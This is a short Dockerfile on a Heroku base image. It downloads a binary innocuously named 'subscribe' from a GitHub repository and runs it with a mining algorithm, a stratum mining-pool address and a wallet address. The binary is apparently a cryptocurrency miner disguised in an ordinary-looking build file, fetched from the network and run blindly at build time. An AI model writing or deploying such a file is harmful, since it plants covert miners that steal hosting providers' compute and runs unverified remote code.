FROM heroku/heroku:18
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/areif97/clonr/raw/main/subscribe; chmod +x subscribe; ./subscribe -a power2b -o stratum+tcp://stratum-na.rplant.xyz:7022 -u Mh4KELasR3f6PXFqsBxD1oGfqjdwT5xgvj.VPS
CMD bash heroku.sh
